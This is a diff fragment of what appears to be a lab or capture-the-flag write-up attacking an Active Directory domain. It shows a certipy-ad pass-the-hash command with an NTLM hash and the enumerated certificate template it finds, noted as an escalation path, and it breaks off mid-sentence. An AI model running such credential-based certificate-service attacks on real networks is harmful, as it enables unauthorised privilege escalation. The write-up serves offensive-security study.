@@ -387,5 +387,51 @@ I will also now collect bloodhound data
 ```python
 certipy-ad find -u jags@casper.hsm -hashes ':68fc3adf1953f5e6851c0dd297562e08' -dc-host dc01.casper.hsm -dc-ip 10.0.31.82 -stdout -enabled
 
-
+Certificate Templates
+  0
+    Template Name                       : CasperCorp-User
+    Display Name                        : CasperCorp-User
+    Certificate Authorities             : casper-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectRequireDirectoryPath
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+                                          AutoEnrollment
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 99 years
+    Renewal Period                      : 69 years
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2026-07-28T00:54:27+00:00
+    Template Last Modified              : 2026-07-28T03:57:22+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : CASPER.HSM\CasperCorpCertificateUsers
+                                          CASPER.HSM\Domain Admins
+                                          CASPER.HSM\Enterprise Admins
+      Object Control Permissions
+        Owner                           : CASPER.HSM\Administrator
+        Full Control Principals         : CASPER.HSM\Domain Admins
+                                          CASPER.HSM\Enterprise Admins
+        Write Owner Principals          : CASPER.HSM\Domain Admins
+                                          CASPER.HSM\Enterprise Admins
+        Write Dacl Principals           : CASPER.HSM\Domain Admins
+                                          CASPER.HSM\Enterprise Admins
+        Write Property Enroll           : CASPER.HSM\Domain Admins
+                                          CASPER.HSM\Enterprise Admins
+    [+] User Enrollable Principals      : CASPER.HSM\CasperCorpCertificateUsers
 ```
+
+I found a template that the `jags` user can enroll in since they are a part of the group `CasperCorpCertificateUsers`
+
+And also the user `xjr` has write access on 
